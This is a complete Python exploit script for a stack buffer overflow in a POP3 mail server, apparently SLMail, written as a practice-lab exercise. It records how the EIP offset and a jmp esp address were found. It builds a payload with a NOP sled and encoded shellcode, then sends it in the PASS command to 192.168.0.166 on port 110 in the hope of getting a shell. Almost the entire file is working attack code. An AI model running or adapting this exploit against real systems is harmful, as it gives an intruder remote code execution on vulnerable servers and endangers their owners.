#!/usr/bin/env python

import socket
import struct

# jmp esp --
# !mona jmp -r esp -cpb "\x00\x0A\x0D"

# msf-nasm_shell                                                                                          
# 	nasm > jmp esp                                                                                                                                           
# 	00000000  FFE4              jmp esp                                                                                                                      
#	nasm >

# !mona find -s "\xff\xe4" -m slmfc.dll
ptr_jmp_esp = 0x5f4a358f

# nasm op code slide --
# msf-nasm_shell                                                                                          
#	nasm > sub esp, 0x10                                                                                                                                     
#	00000000  83EC10            sub esp,byte +0x10                                                                                                           
# nasm >
# sub_esp_10 = "\x83\xec\x10"                                        

# buffer --
# msf-pattern_offset -l 2700 -q 39694438
# [*] Exact match at offset 2606
b_totlen = 2700 # payload len / upping from 2700
e_offset = 2606 # eip

# shellcode --
sc =  ""
sc += "\xdd\xc0\xba\xc2\x54\xae\x1b\xd9\x74\x24\xf4\x5e\x33"
sc += "\xc9\xb1\x52\x31\x56\x17\x03\x56\x17\x83\x2c\xa8\x4c"
sc += "\xee\x4c\xb9\x13\x11\xac\x3a\x74\x9b\x49\x0b\xb4\xff"
sc += "\x1a\x3c\x04\x8b\x4e\xb1\xef\xd9\x7a\x42\x9d\xf5\x8d"
sc += "\xe3\x28\x20\xa0\xf4\x01\x10\xa3\x76\x58\x45\x03\x46"
sc += "\x93\x98\x42\x8f\xce\x51\x16\x58\x84\xc4\x86\xed\xd0"
sc += "\xd4\x2d\xbd\xf5\x5c\xd2\x76\xf7\x4d\x45\x0c\xae\x4d"
sc += "\x64\xc1\xda\xc7\x7e\x06\xe6\x9e\xf5\xfc\x9c\x20\xdf"
sc += "\xcc\x5d\x8e\x1e\xe1\xaf\xce\x67\xc6\x4f\xa5\x91\x34"
sc += "\xed\xbe\x66\x46\x29\x4a\x7c\xe0\xba\xec\x58\x10\x6e"
sc += "\x6a\x2b\x1e\xdb\xf8\x73\x03\xda\x2d\x08\x3f\x57\xd0"
sc += "\xde\xc9\x23\xf7\xfa\x92\xf0\x96\x5b\x7f\x56\xa6\xbb"
sc += "\x20\x07\x02\xb0\xcd\x5c\x3f\x9b\x99\x91\x72\x23\x5a"
sc += "\xbe\x05\x50\x68\x61\xbe\xfe\xc0\xea\x18\xf9\x27\xc1"
sc += "\xdd\x95\xd9\xea\x1d\xbc\x1d\xbe\x4d\xd6\xb4\xbf\x05"
sc += "\x26\x38\x6a\x89\x76\x96\xc5\x6a\x26\x56\xb6\x02\x2c"
sc += "\x59\xe9\x33\x4f\xb3\x82\xde\xaa\x54\x6d\xb6\xb4\xa6"
sc += "\x05\xc5\xb4\xa7\x6e\x40\x52\xcd\x80\x05\xcd\x7a\x38"
sc += "\x0c\x85\x1b\xc5\x9a\xe0\x1c\x4d\x29\x15\xd2\xa6\x44"
sc += "\x05\x83\x46\x13\x77\x02\x58\x89\x1f\xc8\xcb\x56\xdf"
sc += "\x87\xf7\xc0\x88\xc0\xc6\x18\x5c\xfd\x71\xb3\x42\xfc"
sc += "\xe4\xfc\xc6\xdb\xd4\x03\xc7\xae\x61\x20\xd7\x76\x69"
sc += "\x6c\x83\x26\x3c\x3a\x7d\x81\x96\x8c\xd7\x5b\x44\x47"
sc += "\xbf\x1a\xa6\x58\xb9\x22\xe3\x2e\x25\x92\x5a\x77\x5a"
sc += "\x1b\x0b\x7f\x23\x41\xab\x80\xfe\xc1\xdb\xca\xa2\x60"
sc += "\x74\x93\x37\x31\x19\x24\xe2\x76\x24\xa7\x06\x07\xd3"
sc += "\xb7\x63\x02\x9f\x7f\x98\x7e\xb0\x15\x9e\x2d\xb1\x3f"

# assemble payload --
buf = ""
buf += "A"*(e_offset)
buf += struct.pack("<I", ptr_jmp_esp)
buf += "\x90"*8
buf += sc # shellcode
buf += "D"*(b_totlen - len(buf))

# here we go --
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.0.166',110))
	print "\nsending shellcode: "
	s.send('USER dirtbag' + '\r\n')
	data = s.recv(1024)

	s.send('PASS ' + buf + '\r\n')
	data = s.recv(1024)
	s.close()
	print "\n[+]attempting shell ??"

except:
	"Connection failed !"

